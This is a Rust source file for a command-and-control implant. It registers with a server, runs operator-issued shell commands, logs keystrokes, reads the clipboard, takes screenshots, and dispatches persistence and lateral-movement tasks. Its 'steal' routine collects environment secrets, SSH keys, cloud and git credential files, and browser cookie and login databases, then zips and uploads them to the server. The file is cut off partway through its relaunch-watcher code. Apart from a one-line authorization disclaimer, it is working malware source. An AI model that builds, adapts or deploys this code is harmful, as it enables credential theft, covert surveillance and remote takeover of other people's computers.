// agent.rs — C2 agent, Rust port (reqwest blocking + serde).
//
// Cargo.toml:
//   [package]
//   name = "c2agent"
//   version = "0.1.0"
//   edition = "2021"
//
//   [dependencies]
//   reqwest = { version = "0.12", features = ["blocking", "json", "multipart"] }
//   serde = { version = "1", features = ["derive"] }
//   serde_json = "1"
//   hostname = "0.4"
//   rdev = "0.5"
//
// Build:  cargo build --release  (binary: target/release/c2agent)
// Run:
//   ./c2agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10
//
// Only use against systems you own or are authorized to test.
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex, LazyLock};
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

static KEYLOG: LazyLock<Mutex<KeyLogger>> = LazyLock::new(|| Mutex::new(KeyLogger::new()));
static CLONES: LazyLock<Mutex<HashMap<String, CloneWatcher>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

#[derive(Serialize)]
struct RegisterBody {
    #[serde(skip_serializing_if = "Option::is_none")]
    agent_id: Option<String>,
    hostname: String,
    username: String,
    os: String,
    arch: String,
    pid: u32,
    ip: String,
    version: String,
    #[serde(rename = "type")]
    client_type: String,
}

#[derive(Serialize)]
struct CheckinBody {
    agent_id: String,
}

#[derive(Serialize)]
struct ResultBody {
    agent_id: String,
    task_id: String,
    output: String,
    exit_code: i32,
    error: String,
}

#[derive(Deserialize)]
struct RegisterResponse {
    agent_id: String,
}

#[derive(Deserialize)]
struct CheckinResponse {
    tasks: Vec<C2Task>,
}

#[derive(Deserialize)]
struct C2Task {
    task_id: String,
    #[serde(rename = "type")]
    task_type: String,
    args: serde_json::Value,
}

struct Agent {
    server: String,
    token: String,
    client: reqwest::blocking::Client,
    agent_id: String,
    interval: u64,
    jitter: u64,
    verbose: bool,
    state_file: PathBuf,
}

const KEYLOG_DUMP_LIMIT: usize = 8000;
const STEAL_KEYWORDS: &[&str] = &[
    "token", "secret", "password", "passwd", "key=", "api", "auth",
    "aws", "azure", "google", "github", "gitlab", "slack", "discord",
    "cookie", "session", "credential", "access", "proxy", "login",
];
const STEAL_TOKEN_FILES: &[&str] = &[
    ".aws/credentials", ".aws/config",
    ".git-credentials", ".netrc", ".npmrc", ".pypirc",
    ".pip/pip.conf", ".config/pip/pip.conf",
    ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
    ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
    ".docker/config.json", ".kube/config",
    ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
    ".ssh/known_hosts", ".ssh/authorized_keys",
];
const STEAL_MAX_FILE: u64 = 8 * 1024 * 1024;
const CHROMIUM_PROFILE_FILES: &[&str] = &["Login Data", "Cookies", "Web Data"];
const FIREFOX_PROFILE_FILES: &[&str] = &["cookies.sqlite", "logins.json", "key4.db", "cert9.db"];

struct KeyLogger {
    buffer: Arc<Mutex<String>>,
    active: Arc<Mutex<bool>>,
    handle: Option<thread::JoinHandle<()>>,
}

impl KeyLogger {
    fn new() -> Self {
        KeyLogger {
            buffer: Arc::new(Mutex::new(String::new())),
            active: Arc::new(Mutex::new(false)),
            handle: None,
        }
    }

    fn start(&mut self) -> String {
        let mut active = self.active.lock().unwrap();
        if *active {
            return "keylogger already running".into();
        }
        let buf = self.buffer.clone();
        let act = self.active.clone();
        *act.lock().unwrap() = true;
        let act2 = act.clone();
        let handle = thread::spawn(move || {
            let callback = move |event: rdev::Event| {
                // Returning None from the rdev callback terminates the grab,
                // which lets `stop` join the thread instead of leaking it.
                if !*act.lock().unwrap() {
                    return None;
                }
                if let rdev::EventType::KeyPress(key) = event.event_type {
                    let mut b = buf.lock().unwrap();
                    b.push_str(&format_key(key));
                    if b.len() > KEYLOG_DUMP_LIMIT * 2 {
                        let cutoff = b.len() - KEYLOG_DUMP_LIMIT;
                        let tail = b.split_off(cutoff);
                        *b = tail;
                    }
                }
                Some(event)
            };
            if rdev::grab(callback).is_err() {
                *act2.lock().unwrap() = false;
            }
        });
        self.handle = Some(handle);
        "keylogger started".into()
    }

    fn stop(&mut self) -> String {
        {
            let mut active = self.active.lock().unwrap();
            if !*active {
                return "keylogger not running".into();
            }
            *active = false;
        }
        // The callback sees the flag and returns None, ending the grab loop;
        // join so the capturing thread (and its device handles) go away.
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
        "keylogger stopped".into()
    }

    fn dump(&self) -> String {
        let b = self.buffer.lock().unwrap();
        if b.is_empty() {
            "(no keystrokes recorded)".into()
        } else if b.len() > KEYLOG_DUMP_LIMIT {
            format!("...{}", &b[b.len() - KEYLOG_DUMP_LIMIT..])
        } else {
            b.clone()
        }
    }
}

fn format_key(key: rdev::Key) -> String {
    match key {
        rdev::Key::Return => "[Enter]".into(),
        rdev::Key::Tab => "[Tab]".into(),
        rdev::Key::Escape => "[Esc]".into(),
        rdev::Key::Space => " ".into(),
        rdev::Key::Backspace => "[BS]".into(),
        rdev::Key::Delete => "[Del]".into(),
        rdev::Key::LeftArrow => "[Left]".into(),
        rdev::Key::UpArrow => "[Up]".into(),
        rdev::Key::RightArrow => "[Right]".into(),
        rdev::Key::DownArrow => "[Down]".into(),
        rdev::Key::ShiftLeft | rdev::Key::ShiftRight => "".into(),
        rdev::Key::ControlLeft | rdev::Key::ControlRight => "".into(),
        rdev::Key::Alt | rdev::Key::AltGr => "".into(),
        rdev::Key::MetaLeft | rdev::Key::MetaRight => "[Win]".into(),
        _ => {
            let name = format!("{:?}", key);
            if name.starts_with('F') && name.len() <= 3 {
                format!("[{name}]")
            } else if name.len() == 1 {
                name.to_lowercase()
            } else {
                format!("[{name}]")
            }
        }
    }
}

impl Agent {
    fn new(server: &str, token: &str, interval: u64, jitter: u64, verbose: bool, state_file: PathBuf) -> Self {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert("X-Agent-Token", token.parse().unwrap());
        let client = reqwest::blocking::Client::builder()
            .default_headers(headers)
            .timeout(Duration::from_secs(120))
            .build()
            .expect("failed to build HTTP client");
        let agent_id = load_id(&state_file);
        Agent {
            server: server.trim_end_matches('/').to_string(),
            token: token.to_string(),
            client,
            agent_id,
            interval,
            jitter,
            verbose,
            state_file,
        }
    }

    fn log(&self, msg: &str) {
        if self.verbose {
            println!("[*] {msg}");
        }
    }

    fn register(&mut self) {
        let body = RegisterBody {
            agent_id: if self.agent_id.is_empty() { None } else { Some(self.agent_id.clone()) },
            hostname: hostname::get().map(|h| h.to_string_lossy().to_string()).unwrap_or_default(),
            username: env::var("USER").or_else(|_| env::var("USERNAME")).unwrap_or_default(),
            os: env::consts::OS.to_string(),
            arch: env::consts::ARCH.to_string(),
            pid: std::process::id(),
            ip: local_ip(),
            version: "1.0".to_string(),
            client_type: "Rust".to_string(),
        };
        let resp: RegisterResponse = match self
            .client
            .post(format!("{}/api/register", self.server))
            .json(&body)
            .send()
        {
            Ok(r) => match r.json() {
                Ok(j) => j,
                Err(e) => {
                    self.log(&format!("register failed: bad response ({e}) — will retry on next checkin"));
                    return;
                }
            },
            Err(e) => {
                self.log(&format!("register failed: {e} — will retry on next checkin"));
                return;
            }
        };
        self.agent_id = resp.agent_id;
        save_id(&self.state_file, &self.agent_id);
        self.log(&format!("registered as {}", self.agent_id));
    }

    fn checkin(&mut self) -> Vec<C2Task> {
        let body = CheckinBody { agent_id: self.agent_id.clone() };
        match self
            .client
            .post(format!("{}/api/checkin", self.server))
            .json(&body)
            .send()
        {
            Ok(resp) if resp.status().is_success() => {
                let parsed: CheckinResponse = resp.json().unwrap_or(CheckinResponse { tasks: vec![] });
                parsed.tasks
            }
            Ok(resp) if resp.status() == reqwest::StatusCode::NOT_FOUND => {
                self.log("server does not know us — re-registering");
                self.register();
                vec![]
            }
            Ok(_) => vec![],
            Err(e) => {
                self.log(&format!("checkin failed: {e}"));
                vec![]
            }
        }
    }

    fn report(&self, task_id: &str, res: &ResultBody) {
        let body = ResultBody {
            agent_id: self.agent_id.clone(),
            task_id: task_id.to_string(),
            output: res.output.clone(),
            exit_code: res.exit_code,
            error: res.error.clone(),
        };
        if let Err(e) = self
            .client
            .post(format!("{}/api/result", self.server))
            .json(&body)
            .send()
        {
            self.log(&format!("failed to report result: {e}"));
        }
    }

    fn execute(&mut self, task: &C2Task) -> ResultBody {
        let mut res = ResultBody {
            agent_id: self.agent_id.clone(),
            task_id: task.task_id.clone(),
            output: String::new(),
            exit_code: 0,
            error: String::new(),
        };
        let args = task.args.as_object().cloned().unwrap_or_default();
        let get = |k: &str| -> String {
            args.get(k)
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string()
        };
        match task.task_type.as_str() {
            "shell" => {
                let timeout = args
                    .get("timeout")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(120)
                    .clamp(1, 3600);
                let (out, code) = run_shell(&get("command"), timeout);
                res.output = out;
                res.exit_code = code;
            }
            "download" => {
                let name = if get("file").is_empty() { "payload.bin".into() } else { get("file") };
                let mut dest = if get("destination").is_empty() { name.clone() } else { get("destination") };
                let r = self
                    .client
                    .get(format!("{}/api/files/{}", self.server, task.task_id))
                    .send();
                match r {
                    Ok(resp) if resp.status().is_success() => {
                        let bytes = resp.bytes().unwrap_or_default();
                        if std::path::Path::new(&dest).is_dir() {
                            dest = std::path::Path::new(&dest)
                                .join(std::path::Path::new(&name).file_name().unwrap_or_default())
                                .to_string_lossy()
                                .to_string();
                        }
                        if let Some(parent) = std::path::Path::new(&dest).parent() {
                            if !parent.as_os_str().is_empty() {
                                let _ = fs::create_dir_all(parent);
                            }
                        }
                        match fs::write(&dest, &bytes) {
                            Ok(_) => {
                                res.output = format!("saved {} bytes to {dest}", bytes.len());
                            }
                            Err(e) => {
                                res.output = format!("error: {e}");
                                res.exit_code = 1;
                            }
                        }
                    }
                    Ok(resp) => {
                        res.output = format!("download failed: HTTP {}", resp.status());
                        res.exit_code = 1;
                    }
                    Err(e) => {
                        res.output = format!("error: {e}");
                        res.exit_code = 1;
                    }
                }
            }
            "upload" => {
                let path = get("path");
                if path.is_empty() {
                    res.output = "no path given".into();
                    res.exit_code = 1;
                } else {
                    match fs::read(&path) {
                        Ok(bytes) => {
                            let form = reqwest::blocking::multipart::Form::new()
                                .part("file", reqwest::blocking::multipart::Part::bytes(bytes));
                            let r = self
                                .client
                                .post(format!("{}/api/files/{}", self.server, task.task_id))
                                .multipart(form)
                                .send();
                            match r {
                                Ok(resp) if resp.status().is_success() => {
                                    res.output = format!("uploaded {path}");
                                }
                                Ok(resp) => {
                                    res.output = format!("upload failed: HTTP {}", resp.status());
                                    res.exit_code = 1;
                                }
                                Err(e) => {
                                    res.output = format!("error: {e}");
                                    res.exit_code = 1;
                                }
                            }
                        }
                        Err(e) => {
                            res.output = format!("error reading {path}: {e}");
                            res.exit_code = 1;
                        }
                    }
                }
            }
            "screenshot" => {
                let label = if get("name").is_empty() { "screenshot".into() } else { get("name") };
                let tmp = std::env::temp_dir()
                    .join(format!("c2shot_{}.png", std::process::id()));
                let tmp_disp = tmp.to_string_lossy().replace('\\', "/");
                let cmd = if env::consts::OS == "windows" {
                    format!(
                        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bmp.Save('{tmp_disp}');"
                    )
                } else if env::consts::OS == "macos" {
                    format!("screencapture -x {tmp_disp}")
                } else {
                    format!(
                        "(command -v import && import -window root {tmp_disp}) || (command -v scrot && scrot {tmp_disp}) || (command -v gnome-screenshot && gnome-screenshot -f {tmp_disp})"
                    )
                };
                let code = if env::consts::OS == "windows" {
                    match Command::new("powershell")
                        .arg("-command")
                        .arg(&cmd)
                        .status()
                    {
                        Ok(s) => s.code().unwrap_or(1),
                        Err(_) => 1,
                    }
                } else {
                    run_shell(&cmd, 30).1
                };
                if code != 0 || !tmp.exists() || fs::metadata(&tmp).map(|m| m.len()).unwrap_or(0) == 0 {
                    let _ = fs::remove_file(&tmp);
                    res.output = "error: screenshot failed".into();
                    res.exit_code = 1;
                } else {
                    match fs::read(&tmp) {
                        Ok(bytes) => {
                            let _ = fs::remove_file(&tmp);
                            let form = reqwest::blocking::multipart::Form::new()
                                .part(
                                    "file",
                                    reqwest::blocking::multipart::Part::bytes(bytes)
                                        .file_name(format!("{label}.png"))
                                        .mime_str("image/png")
                                        .unwrap(),
                                );
                            let r = self
                                .client
                                .post(format!("{}/api/files/{}", self.server, task.task_id))
                                .multipart(form)
                                .send();
                            match r {
                                Ok(resp) if resp.status().is_success() => {
                                    res.output = format!("screenshot saved ({label}.png)");
                                }
                                Ok(resp) => {
                                    res.output = format!("screenshot upload failed: HTTP {}", resp.status());
                                    res.exit_code = 1;
                                }
                                Err(e) => {
                                    res.output = format!("error: {e}");
                                    res.exit_code = 1;
                                }
                            }
                        }
                        Err(e) => {
                            let _ = fs::remove_file(&tmp);
                            res.output = format!("error: {e}");
                            res.exit_code = 1;
                        }
                    }
                }
            }
            "sleep" => {
                if let Ok(s) = get("seconds").parse::<u64>() {
                    if s >= 1 {
                        self.interval = s;
                    }
                }
                res.output = format!("heartbeat interval set to {}s", self.interval);
            }
            "keylog" => {
                let action = get("action");
                let mut kl = KEYLOG.lock().unwrap();
                res.output = match action.as_str() {
                    "start" => kl.start(),
                    "stop" => kl.stop(),
                    _ => kl.dump(),
                };
            }
            "clipboard" => {
                let action = get("action");
                if action == "set" {
                    let (out, code) = clipboard_set(&get("text"));
                    res.output = out;
                    res.exit_code = code;
                } else {
                    let (out, code) = clipboard_get();
                    res.output = out;
                    res.exit_code = code;
                }
            }
            "steal" => {
                let profile = get("profile");
                let profile = match profile.as_str() {
                    "all" | "env" | "tokens" | "browser" => profile,
                    _ => "all".to_string(),
                };
                let (out, code) = do_steal(&task.task_id, &profile, &self.client, &self.server);
                res.output = out;
                res.exit_code = code;
            }
            "clone" => {
                let (out, code) = do_clone(
                    &self.client,
                    &self.server,
                    &self.token,
                    &self.agent_id,
                    args,
                );
                res.output = out;
                res.exit_code = code;
            }
            "persistence" => {
                let (out, code) =
                    do_persistence(&self.server, &self.token, self.interval, self.jitter);
                res.output = out;
                res.exit_code = code;
            }
            "lateral" => {
                let (out, code) = do_lateral(
                    &self.server,
                    &self.token,
                    self.interval,
                    self.jitter,
                    args,
                );
                res.output = out;
                res.exit_code = code;
            }
            "exit" => {
                res.output = "exiting".into();
            }
            _ => {
                res.output = format!("unknown task type: {}", task.task_type);
                res.exit_code = 1;
            }
        }
        res
    }

    fn run(&mut self) {
        if self.agent_id.is_empty() {
            self.register();
        }
        loop {
            let tasks = self.checkin();
            for t in tasks {
                self.log(&format!("running task {} ({})", t.task_id, t.task_type));
                let res = self.execute(&t);
                let task_type = t.task_type.clone();
                let task_id = t.task_id.clone();
                self.report(&task_id, &res);
                if task_type == "exit" {
                    return;
                }
            }
            thread::sleep(Duration::from_secs(self.interval));
            if self.jitter > 0 {
                // No `rand` dependency: derive jitter from a monotonic clock.
                let mut seed = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_nanos() as u64)
                    .unwrap_or(0);
                seed ^= seed << 13;
                seed ^= seed >> 7;
                seed ^= seed << 17;
                thread::sleep(Duration::from_millis((seed % (self.jitter * 1000)) as u64));
            }
        }
    }
}

// ---------------------------------------------------------------- helpers

fn home_file(name: &str) -> PathBuf {
    if let Some(home) = env::var_os("HOME") {
        PathBuf::from(home).join(name)
    } else if let Some(home) = env::var_os("USERPROFILE") {
        PathBuf::from(home).join(name)
    } else {
        PathBuf::from(name)
    }
}

fn load_id(state_file: &PathBuf) -> String {
    fs::read_to_string(state_file)
        .ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .and_then(|v| v.get("agent_id").and_then(|x| x.as_str()).map(String::from))
        .unwrap_or_default()
}

fn save_id(state_file: &PathBuf, agent_id: &str) {
    let _ = fs::write(state_file, json!({ "agent_id": agent_id }).to_string());
}

fn local_ip() -> String {
    // best-effort: UDP "connect" without sending data
    if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
        if socket.connect("8.8.8.8:80").is_ok() {
            if let Ok(local) = socket.local_addr() {
                return local.ip().to_string();
            }
        }
    }
    String::new()
}

fn run_shell(command: &str, timeout_secs: u64) -> (String, i32) {
    use std::io::Read;
    use std::sync::mpsc;
    let mut cmd = if env::consts::OS == "windows" {
        let mut c = Command::new("cmd");
        c.arg("/C").arg(command);
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c").arg(command);
        c
    };
    let mut child = match cmd.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn() {
        Ok(c) => c,
        Err(e) => return (format!("error spawning shell: {e}"), 1),
    };
    // Drain both pipes on dedicated threads so a chatty child can never
    // deadlock on a full OS pipe while the main loop polls the process.
    let mut out_pipe = child.stdout.take();
    let mut err_pipe = child.stderr.take();
    let (out_tx, out_rx) = mpsc::channel::<Vec<u8>>();
    let (err_tx, err_rx) = mpsc::channel::<Vec<u8>>();
    if let Some(mut p) = out_pipe.take() {
        thread::spawn(move || {
            let mut buf = Vec::new();
            let _ = p.read_to_end(&mut buf);
            let _ = out_tx.send(buf);
        });
    }
    if let Some(mut p) = err_pipe.take() {
        thread::spawn(move || {
            let mut buf = Vec::new();
            let _ = p.read_to_end(&mut buf);
            let _ = err_tx.send(buf);
        });
    }
    let start = std::time::Instant::now();
    let deadline = Duration::from_secs(timeout_secs.max(1));
    let collect = |fragment: Vec<u8>, out: &mut String| {
        out.push_str(&String::from_utf8_lossy(&fragment));
        if out.len() > 12000 {
            let head = 2400;
            let tail = 12000 - head - 40;
            let truncated = out.len() - head - tail;
            *out = format!("{}... [{truncated} chars truncated] ...{}",
                           &out[..head], &out[out.len() - tail..]);
        }
    };
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                drop(child.stdin.take());
                let mut out = String::new();
                if let Ok(f) = out_rx.recv_timeout(Duration::from_millis(250)) {
                    collect(f, &mut out);
                }
                if let Ok(f) = err_rx.recv_timeout(Duration::from_millis(250)) {
                    collect(f, &mut out);
                }
                return (out, status.code().unwrap_or(1));
            }
            Ok(None) => {
                if start.elapsed() > deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    let mut out = String::new();
                    if let Ok(f) = out_rx.recv_timeout(Duration::from_millis(250)) {
                        collect(f, &mut out);
                    }
                    if let Ok(f) = err_rx.recv_timeout(Duration::from_millis(250)) {
                        collect(f, &mut out);
                    }
                    return (format!("command timed out ({timeout_secs}s)"), 124);
                }
                thread::sleep(Duration::from_millis(100));
            }
            Err(e) => return (format!("error: {e}"), 1),
        }
    }
}

fn clipboard_get() -> (String, i32) {
    if env::consts::OS == "windows" {
        match Command::new("powershell").arg("-command").arg("Get-Clipboard").output() {
            Ok(o) => (String::from_utf8_lossy(&o.stdout).trim().to_string(), o.status.code().unwrap_or(1)),
            Err(e) => (format!("error: {e}"), 1),
        }
    } else {
        // try xclip, xsel, pbpaste
        for cmd in [
            vec!["xclip".to_string(), "-selection".to_string(), "clipboard".to_string(), "-o".to_string()],
            vec!["xsel".to_string(), "--clipboard".to_string(), "--output".to_string()],
            vec!["pbpaste".to_string()],
        ] {
            if let Ok(o) = Command::new(&cmd[0]).args(&cmd[1..]).output() {
                if o.status.success() {
                    return (String::from_utf8_lossy(&o.stdout).to_string(), 0);
                }
            }
        }
        ("error: no clipboard tool available".into(), 1)
    }
}

fn clipboard_set(text: &str) -> (String, i32) {
    if env::consts::OS == "windows" {
        let escaped = text.replace('\'', "''");
        let arg = format!("Set-Clipboard -Value '{escaped}'");
        match Command::new("powershell").arg("-command").arg(&arg).output() {
            Ok(_) => ("clipboard set".into(), 0),
            Err(e) => (format!("error: {e}"), 1),
        }
    } else {
        for cmd in [
            vec!["xclip".to_string(), "-selection".to_string(), "clipboard".to_string()],
            vec!["xsel".to_string(), "--clipboard".to_string(), "--input".to_string()],
            vec!["pbcopy".to_string()],
        ] {
            if let Ok(mut child) = Command::new(&cmd[0]).args(&cmd[1..]).stdin(Stdio::piped()).spawn() {
                if let Some(mut stdin) = child.stdin.take() {
                    use std::io::Write;
                    let _ = stdin.write_all(text.as_bytes());
                }
                if let Ok(_) = child.wait() {
                    return ("clipboard set".into(), 0);
                }
            }
        }
        ("error: no clipboard tool available".into(), 1)
    }
}

// ---------------------------------------------------------------- steal

fn steal_env(work: &PathBuf) -> Vec<String> {
    let mut lines: Vec<String> = Vec::new();
    for (k, v) in env::vars() {
        let low = k.to_lowercase();
        if STEAL_KEYWORDS.iter().any(|w| low.contains(w)) {
            lines.push(format!("{k}={v}"));
        }
    }
    if lines.is_empty() {
        return vec![];
    }
    lines.sort();
    let _ = fs::write(work.join("env.txt"), lines.join("\n") + "\n");
    vec!["env.txt".to_string()]
}

fn steal_safe_copy(src: &PathBuf, dst_dir: &PathBuf) -> bool {
    match fs::metadata(src) {
        Ok(m) if m.is_file() && m.len() <= STEAL_MAX_FILE => {}
        _ => return false,
    }
    if fs::create_dir_all(dst_dir).is_err() {
        return false;
    }
    fs::copy(src, dst_dir.join(src.file_name().unwrap_or_default())).is_ok()
}

fn steal_tokens(work: &PathBuf) -> Vec<String> {
    let home = home_file("");
    let tokens_dir = work.join("tokens");
    let mut hits = Vec::new();
    for rel in STEAL_TOKEN_FILES {
        let src = home.join(rel);
        if steal_safe_copy(&src, &tokens_dir) {
            hits.push(format!(
                "tokens/{}",
                PathBuf::from(rel).file_name().unwrap_or_default().to_string_lossy()
            ));
        }
    }
    hits
}

fn browser_roots() -> Vec<(PathBuf, &'static str)> {
    let mut roots = Vec::new();
    let home = match env::var("HOME").or_else(|_| env::var("USERPROFILE")) {
        Ok(h) => PathBuf::from(h),
        Err(_) => return roots,
    };
    if env::consts::OS == "windows" {
        let la = env::var("LOCALAPPDATA").unwrap_or_default();
        let appd = env::var("APPDATA").unwrap_or_default();
        for rel in [
            "Google/Chrome/User Data",
            "Microsoft/Edge/User Data",
            "BraveSoftware/Brave-Browser/User Data",
            "Opera Software/Opera Stable",
        ] {
            if !la.is_empty() {
                roots.push((PathBuf::from(&la).join(rel), "chromium"));
            }
        }
        if !appd.is_empty() {
            roots.push((PathBuf::from(&appd).join("Mozilla/Firefox/Profiles"), "firefox"));
        }
    } else if env::consts::OS == "macos" {
        let base = home.join("Library/Application Support");
        for name in ["Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser"] {
            roots.push((base.join(name), "chromium"));
        }
        roots.push((base.join("Firefox/Profiles"), "firefox"));
    } else {
        for rel in [
            "google-chrome", "chromium", "microsoft-edge", "msedge",
            "brave-browser", "brave", "opera",
        ] {
            roots.push((home.join(".config").join(rel), "chromium"));
        }
        roots.push((home.join(".mozilla/firefox"), "firefox"));
    }
    roots
}

fn steal_browser_walk(
    root: &PathBuf, kind: &str, targets: &[&str],
    work: &PathBuf, hits: &mut Vec<String>,
) {
    let entries = match fs::read_dir(root) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            for fn_name in targets {
                let src = path.join(fn_name);
                if src.is_file() {
                    let rel = path.strip_prefix(root).unwrap_or(&path);
                    let rel_replaced = rel.to_string_lossy()
                        .replace('\\', "__").replace('/', "__");
                    let dst_dir = work.join("browser").join(kind).join(&rel_replaced);
                    if steal_safe_copy(&src, &dst_dir) {
                        hits.push(format!("browser/{kind}/{rel_replaced}/{fn_name}"));
                    }
                }
            }
            steal_browser_walk(&path, kind, targets, work, hits);
        }
    }
}

fn steal_browser(work: &PathBuf) -> Vec<String> {
    let mut hits = Vec::new();
    for (root, kind) in browser_roots() {
        if !root.is_dir() {
            continue;
        }
        let targets: &[&str] = if kind == "firefox" {
            FIREFOX_PROFILE_FILES
        } else {
            CHROMIUM_PROFILE_FILES
        };
        steal_browser_walk(&root, kind, targets, work, &mut hits);
    }
    hits
}

fn create_zip(work: &PathBuf, archive: &PathBuf) -> bool {
    let archive_s = archive.to_string_lossy().to_string();
    if let Ok(o) = Command::new("zip")
        .arg("-r").arg(&archive_s).arg(".").arg("-x").arg("steal.zip")
        .current_dir(work)
        .output()
    {
        if o.status.success() {
            return true;
        }
    }
    if let Ok(o) = Command::new("tar")
        .args(["-cf", &archive_s, "."])
        .current_dir(work)
        .output()
    {
        o.status.success()
    } else {
        false
    }
}

fn do_steal(task_id: &str, profile: &str, client: &reqwest::blocking::Client, server: &str) -> (String, i32) {
    let work = std::env::temp_dir().join(format!("c2steal_{}", std::process::id()));
    let _ = fs::create_dir_all(&work);

    let mut manifest: Vec<String> = Vec::new();
    if profile == "all" || profile == "env" {
        manifest.extend(steal_env(&work));
    }
    if profile == "all" || profile == "tokens" {
        manifest.extend(steal_tokens(&work));
    }
    if profile == "all" || profile == "browser" {
        manifest.extend(steal_browser(&work));
    }

    if manifest.is_empty() {
        let _ = fs::remove_dir_all(&work);
        return (format!("steal ({profile}): nothing found"), 1);
    }

    let mut sorted = manifest.clone();
    sorted.sort();
    let _ = fs::write(work.join("manifest.txt"), sorted.join("\n") + "\n");

    let archive = work.join("steal.zip");
    if !create_zip(&work, &archive) {
        let _ = fs::remove_dir_all(&work);
        return ("error: failed to create steal.zip".to_string(), 1);
    }

    let size = fs::metadata(&archive).map(|m| m.len()).unwrap_or(0);
    let bytes = match fs::read(&archive) {
        Ok(b) => b,
        Err(e) => {
            let _ = fs::remove_dir_all(&work);
            return (format!("error: {e}"), 1);
        }
    };

    let form = reqwest::blocking::multipart::Form::new()
        .part(
            "file",
            reqwest::blocking::multipart::Part::bytes(bytes)
                .file_name("steal.zip")
                .mime_str("application/zip")
                .unwrap(),
        );

    let r = client
        .post(format!("{server}/api/files/{task_id}"))
        .multipart(form)
        .send();

    let _ = fs::remove_dir_all(&work);

    match r {
        Ok(resp) if resp.status().is_success() => {
            let listing = sorted.join("\n");
            (
                format!(
                    "stole {} item(s) -> steal.zip ({size} bytes)\n{listing}",
                    manifest.len()
                ),
                0,
            )
        }
        Ok(resp) => (format!("steal upload failed: HTTP {}", resp.status()), 1),
        Err(e) => (format!("error: {e}"), 1),
    }
}

// ------------------------------------------------------------------ clone

struct CloneWatcher {
    status: Mutex<String>,
    last_check: Mutex<String>,
    relaunches: Mutex<u32>,
    command: String,
    interval: u64,
    stop: Arc<AtomicBool>,
    handle: Option<thread::JoinHandle<()>>,
}

fn clone_now_str() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let days = secs / 86400;
    let rem = secs % 86400;
    let hh = rem / 3600;
    let mm = (rem % 3600) / 60;
    let ss = rem % 60;
    let mut y = 1970;
    let mut d = days as i64;
    while d >= (if is_leap(y) { 366 } else { 365 }) {
        d -= if is_leap(y) { 366 } else { 365 };
        y += 1;
    }
    let leap = is_leap(y);
    let mdays = [31, if leap { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut mo = 0;
    while mo < 12 && d >= mdays[mo] {
        d -= mdays[mo];
        mo += 1;
    }
    format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", y, mo + 1, d + 1, hh, mm, ss)
}

fn is_leap(y: i64) -> bool {
    (y % 4 == 0 && y % 100 != 0) || y % 400 == 0
}

fn relaunch_detached(command: &str) {
    let mut cmd = if env::consts::OS == "windows" {
        let mut c = Command::new("cmd");
        c.arg("/C");
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c");
        c
    };
    cmd.arg(command)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    let _ = cmd.spawn();
}

fn do_clone(
    client: &reqwest::blocking::Client,
    server: &str,
    token: &str,
    self_agent_id: &str,
    args: serde_json::Map<String, serde_json::Value>,
) -> (String, i32) {
    let get = |k: &str| -> String {
        args.get(k)
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string()
    };
    let action = {
        let a = get("action").to_lowercase();
        if a.is_empty() { "start".to_string() } else { a }
    };
    let target = {
        let t = get("target");
        if t.is_empty() { self_agent_id.to_string() } else { t }
    };
    let command = get("command");
    let interval = get("interval").parse::<u64>().unwrap_or(30).clamp(5, 3600);

    let new_watcher = || CloneWatcher {
        status: Mutex::new("starting".to_string()),
        last_check: Mutex::new("never".to_string()),
        relaunches: Mutex::new(0),
        command: command.clone(),
        interval,
        stop: Arc::new(AtomicBool::new(false)),
        handle: None,
    };

    if action == "stop" {
        let mut map = CLONES.lock().unwrap();
        if let Some(w) = map.remove(&target) {
            w.stop.store(true, Ordering::SeqCst);
            if let Some(h) = w.handle {
                let _ = h.join();
            }
            return (format!("clone: watcher for {} stopped", target), 0);
        }
        return (format!("clone: no watcher for {}", target), 1);
    }

    if action == "status" {
        let map = CLONES.lock().unwrap();
        if map.is_empty() {
            return ("clone: no watchers running".to_string(), 0);
        }
        let mut lines: Vec<String> = map
            .iter()
            .map(|(tid, w)| {
                format!(
                    "  {}: {} | last_check {} | relaunched {}x | cmd: {}",
                    tid,
                    *w.status.lock().unwrap(),
                    *w.last_check.lock().unwrap(),
                    *w.relaunches.lock().unwrap(),
                    if w.command.is_empty() { "(none)" } else { &w.command }
                )
            })
            .collect();
        lines.sort();
